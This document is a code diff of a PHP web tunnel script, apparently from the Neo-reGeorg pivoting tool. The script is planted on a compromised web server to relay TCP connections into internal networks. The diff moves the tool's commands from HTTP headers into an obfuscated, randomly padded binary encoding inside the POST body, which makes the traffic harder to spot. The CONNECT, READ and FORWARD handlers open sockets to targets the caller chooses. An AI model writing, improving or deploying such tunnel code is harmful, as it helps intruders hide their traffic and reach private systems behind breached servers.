@@ -5,38 +5,63 @@ error_reporting(E_ERROR | E_PARSE);
 
 if(version_compare(PHP_VERSION,'5.4.0','>='))@http_response_code(HTTPCODE);
 
-if( !function_exists('apache_request_headers') ) {
-    function apache_request_headers() {
-        $arh = array();
-        $rx_http = '/\AHTTP_/';
-
-        foreach($_SERVER as $key => $val) {
-            if( preg_match($rx_http, $key) ) {
-                $arh_key = preg_replace($rx_http, '', $key);
-                $rx_matches = array();
-                $rx_matches = explode('_', $arh_key);
-                if( count($rx_matches) > 0 and strlen($arh_key) > 2 ) {
-                    foreach($rx_matches as $ak_key => $ak_val) {
-                        $rx_matches[$ak_key] = ucfirst($ak_val);
-                    }
-
-                    $arh_key = implode('-', $rx_matches);
-                }
-                $arh[ucwords(strtolower($arh_key))] = $val;
-            }
-        }
-        return($arh);
+function blv_decode($data) {
+    $data_len = strlen($data);
+    $info = [];
+    $i = 0;
+    while ( $i < $data_len) {
+        $d = unpack("c1b/N1l", substr($data, $i, 5));
+        $b = $d['b'];
+        $l = $d['l'] - BLV_L_OFFSET;
+        $i += 5;
+        $v = substr($data, $i, $l);
+        $i += $l;
+        $info[$b] = $v;
     }
+    return $info;
 }
 
-set_time_limit(0);
-$headers=apache_request_headers();
+function blv_encode($info) {
+    $data = "";
+    $info[0] = randstr();
+    $info[39] = randstr();
+
+    foreach($info as $b => $v) {
+        $l = strlen($v) + BLV_L_OFFSET;
+        $data .= pack("c1N1", $b, $l);
+        $data .= $v;
+    }
+    return $data;
+}
+
+function randstr() {
+    $rand = '';
+    $length = mt_rand(5, 20);
+    for ($i = 0; $i < $length; $i++) {
+        $rand .= chr(mt_rand(0, 255));
+    }
+    return $rand;
+}
+
+$DATA          = 1;
+$CMD           = 2;
+$MARK          = 3;
+$STATUS        = 4;
+$ERROR         = 5;
+$IP            = 6;
+$PORT          = 7;
+$REDIRECTURL   = 8;
+$FORCEREDIRECT = 9;
+
 $en = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
 $de = "BASE64 CHARSLIST";
 
-$cmd = $headers["X-CMD"];
-$mark = substr($cmd,0,22);
-$cmd = substr($cmd, 22);
+$post_data = file_get_contents("php://input");
+$info = blv_decode(base64_decode(strtr($post_data, $de, $en)));
+$rinfo = array();
+
+$mark = $info[$MARK];
+$cmd = $info[$CMD];
 $run = "run".$mark;
 $writebuf = "writebuf".$mark;
 $readbuf = "readbuf".$mark;
@@ -44,15 +69,15 @@ $readbuf = "readbuf".$mark;
 switch($cmd){
     case "CONNECT":
         {
-            $target_ary = explode("|", base64_decode(strtr($headers["X-TARGET"], $de, $en)));
-            $target = $target_ary[0];
-            $port = (int)$target_ary[1];
-            $res = fsockopen($target, $port, $errno, $errstr, 1);
+            set_time_limit(0);
+            $target = $info[$IP];
+            $port = (int) $info[$PORT];
+            $res = fsockopen($target, $port, $errno, $errstr, 3);
             if ($res === false)
             {
-                header('X-STATUS: FAIL');
-                header('X-ERROR: Failed connecting to target');
-                return;
+                $rinfo[$STATUS] = 'FAIL';
+                $rinfo[$ERROR] = 'Failed connecting to target';
+                break;
             }
 
             stream_set_blocking($res, false);
@@ -88,7 +113,7 @@ switch($cmd){
                     }
                 }
                 stream_set_blocking($res, false);
-                while ($o = fgets($res, 10)) {
+                while ($o = fgets($res, READBUF)) {
                     if($o === false)
                     {
                         @session_start();
@@ -97,6 +122,9 @@ switch($cmd){
                         return;
                     }
                     $readBuff .= $o;
+                    if ( strlen($readBuff) > MAXREADSIZE ) {
+                        break;
+                    }
                 }
                 if ($readBuff != ""){
                     @session_start();
@@ -125,11 +153,12 @@ switch($cmd){
             $running = $_SESSION[$run];
             session_write_close();
             if ($running) {
-                header('X-STATUS: OK');
+                $rinfo[$STATUS] = 'OK';
+                $rinfo[$DATA] = $readBuffer;
                 header("Connection: Keep-Alive");
-                echo strtr(base64_encode($readBuffer), $en, $de);
             } else {
-                header('X-STATUS: FAIL');
+                $rinfo[$STATUS] = 'FAIL';
+                $rinfo[$ERROR] = 'TCP session is closed';
             }
         }
         break;
@@ -138,27 +167,31 @@ switch($cmd){
             $running = $_SESSION[$run];
             session_write_close();
             if(!$running){
-                header('X-STATUS: FAIL');
-                header('X-ERROR: No more running, close now');
-                return;
+                $rinfo[$STATUS] = 'FAIL';
+                $rinfo[$ERROR] = 'TCP session is closed';
+                break;
             }
-            header('Content-Type: application/octet-stream');
-            $rawPostData = file_get_contents("php://input");
+            $rawPostData = $info[$DATA];
             if ($rawPostData) {
                 @session_start();
-                $_SESSION[$writebuf] .= base64_decode(strtr($rawPostData, $de, $en));
+                $_SESSION[$writebuf] .= $rawPostData;
                 session_write_close();
-                header('X-STATUS: OK');
+                $rinfo[$STATUS] = 'OK';
                 header("Connection: Keep-Alive");
             } else {
-                header('X-STATUS: FAIL');
-                header('X-ERROR: POST request read filed');
+                $rinfo[$STATUS] = 'FAIL';
+                $rinfo[$ERROR] = 'POST data parse error';
             }
         }
         break;
     default: {
+        $sayhello = true;
         @session_start();
         session_write_close();
-        exit("Georg says, 'All seems fine'");
     }
+}
+if ( $sayhello ) {
+    echo base64_decode(strtr("NeoGeorg says, 'All seems fine'", $de, $en));
+} else {
+    echo strtr(base64_encode(blv_encode($rinfo)), $en, $de);
 }
